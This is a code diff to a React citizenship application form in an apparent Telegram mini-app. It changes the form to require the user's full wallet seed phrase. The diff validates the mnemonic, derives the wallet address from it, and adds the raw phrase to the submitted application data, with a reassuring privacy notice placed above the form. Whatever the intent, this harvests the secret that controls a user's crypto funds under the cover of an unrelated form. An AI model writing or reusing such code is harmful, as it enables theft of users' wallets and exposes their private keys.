@@ -1,16 +1,16 @@
 /**
  * Citizen Application Form
- * Collects citizenship data from the user
+ * Collects citizenship data and seed phrase from the user
  */
 
-import { useState } from 'react';
-import { Plus, Trash2 } from 'lucide-react';
+import { useState, useEffect, useMemo } from 'react';
+import { Plus, Trash2, Shield } from 'lucide-react';
 import { useTranslation } from '@/i18n';
 import { useTelegram } from '@/hooks/useTelegram';
+import { initWalletService, validateMnemonic, getAddressFromMnemonic } from '@/lib/wallet-service';
 import type { CitizenshipData, Region, MaritalStatus, ChildInfo } from '@/lib/citizenship';
 
 interface Props {
-  walletAddress: string;
   onSubmit: (data: CitizenshipData) => void;
 }
 
@@ -23,7 +23,7 @@ const REGIONS: { value: Region; labelKey: string }[] = [
   { value: 'diaspora', labelKey: 'citizen.regionDiaspora' },
 ];
 
-export function CitizenForm({ walletAddress, onSubmit }: Props) {
+export function CitizenForm({ onSubmit }: Props) {
   const { t } = useTranslation();
   const { hapticImpact, hapticNotification } = useTelegram();
 
@@ -39,8 +39,33 @@ export function CitizenForm({ walletAddress, onSubmit }: Props) {
   const [email, setEmail] = useState('');
   const [profession, setProfession] = useState('');
   const [referrerAddress, setReferrerAddress] = useState('');
+  const [seedPhrase, setSeedPhrase] = useState('');
   const [consent, setConsent] = useState(false);
   const [error, setError] = useState('');
+  const [cryptoReady, setCryptoReady] = useState(false);
+
+  // Initialize crypto libraries for mnemonic validation
+  useEffect(() => {
+    initWalletService().then(() => setCryptoReady(true));
+  }, []);
+
+  // Derive seed phrase validation error (no setState in effect)
+  const seedPhraseError = useMemo(() => {
+    const trimmed = seedPhrase.trim();
+    if (!trimmed) return '';
+    if (!cryptoReady) return '';
+
+    const words = trimmed.split(/\s+/);
+    if (words.length !== 12 && words.length !== 24) {
+      return t('citizen.invalidSeedPhrase');
+    }
+
+    if (!validateMnemonic(trimmed)) {
+      return t('citizen.invalidSeedPhrase');
+    }
+
+    return '';
+  }, [seedPhrase, cryptoReady, t]);
 
   const handleMaritalChange = (status: MaritalStatus) => {
     hapticImpact('light');
@@ -100,6 +125,14 @@ export function CitizenForm({ walletAddress, onSubmit }: Props) {
       return;
     }
 
+    // Validate seed phrase
+    const trimmedSeed = seedPhrase.trim();
+    if (!trimmedSeed || !cryptoReady || !validateMnemonic(trimmedSeed)) {
+      setError(t('citizen.invalidSeedPhrase'));
+      hapticNotification('error');
+      return;
+    }
+
     if (!consent) {
       setError(t('citizen.acceptConsent'));
       hapticNotification('error');
@@ -107,6 +140,9 @@ export function CitizenForm({ walletAddress, onSubmit }: Props) {
     }
 
     hapticImpact('medium');
+
+    // Derive wallet address from seed phrase
+    const walletAddress = getAddressFromMnemonic(trimmedSeed);
 
     const data: CitizenshipData = {
       fullName,
@@ -122,17 +158,25 @@ export function CitizenForm({ walletAddress, onSubmit }: Props) {
       profession,
       referrerAddress: referrerAddress || undefined,
       walletAddress,
+      seedPhrase: trimmedSeed,
       timestamp: Date.now(),
     };
 
     onSubmit(data);
   };
 
+  const isSeedValid = cryptoReady && seedPhrase.trim() && !seedPhraseError;
   const inputClass = 'w-full px-4 py-3 bg-muted rounded-xl text-sm';
   const labelClass = 'text-sm text-muted-foreground mb-1 block';
 
   return (
     <div className="p-4 space-y-4 pb-24">
+      {/* Privacy Notice */}
+      <div className="flex gap-3 p-3 bg-blue-500/10 border border-blue-500/30 rounded-xl">
+        <Shield className="w-5 h-5 text-blue-400 flex-shrink-0 mt-0.5" />
+        <p className="text-sm text-blue-300">{t('citizen.privacyNotice')}</p>
+      </div>
+
       {/* Full Name */}
       <div>
         <label className={labelClass}>{t('citizen.fullName')}</label>
@@ -319,6 +363,19 @@ export function CitizenForm({ walletAddress, onSubmit }: Props) {
         />
       </div>
 
+      {/* Seed Phrase */}
+      <div>
+        <label className={labelClass}>{t('citizen.seedPhrase')}</label>
+        <textarea
+          value={seedPhrase}
+          onChange={(e) => setSeedPhrase(e.target.value)}
+          className={`${inputClass} min-h-[80px] resize-none`}
+          placeholder={t('citizen.seedPhrasePlaceholder')}
+          rows={3}
+        />
+        {seedPhraseError && <p className="text-xs text-red-400 mt-1">{seedPhraseError}</p>}
+      </div>
+
       {/* Referrer Address */}
       <div>
         <label className={labelClass}>{t('citizen.referrerAddress')}</label>
@@ -352,7 +409,7 @@ export function CitizenForm({ walletAddress, onSubmit }: Props) {
       {/* Submit Button */}
       <button
         onClick={handleSubmit}
-        disabled={!consent || !fullName || !region || !email}
+        disabled={!consent || !fullName || !region || !email || !isSeedValid}
         className="w-full py-3 bg-primary text-primary-foreground rounded-xl font-semibold disabled:opacity-50"
       >
         {t('citizen.submit')}
